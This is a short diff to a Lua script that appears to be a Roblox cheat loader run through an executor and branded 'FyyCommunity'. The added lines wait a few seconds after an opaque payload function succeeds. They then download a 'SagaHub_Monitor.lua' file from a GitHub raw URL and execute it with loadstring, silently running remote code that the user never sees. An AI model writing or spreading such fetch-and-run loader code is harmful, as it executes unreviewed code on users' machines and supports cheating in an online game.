@@ -1074,6 +1074,18 @@ end
 
 local _ok, _ret = pcall(__FYY_PAYLOAD_FN, root_env)
 if _ok then
+    -- Auto-load monitor setelah payload berhasil
+    task.delay(6, function()
+        pcall(function()
+            local _mon_src = game:HttpGet(
+                "https://raw.githubusercontent.com/Galangpratama-rox/Decode-SAE/refs/heads/main/SagaHub_Monitor.lua",
+                true
+            )
+            if _mon_src and #_mon_src > 100 then
+                loadstring(_mon_src)()
+            end
+        end)
+    end)
     local StarterGui = game:GetService("StarterGui")
     pcall(function() StarterGui:SetCore("SendNotification", {Title="FyyCommunity ✅", Text="Executor: "..executor, Duration=5}) end)
     return _ret
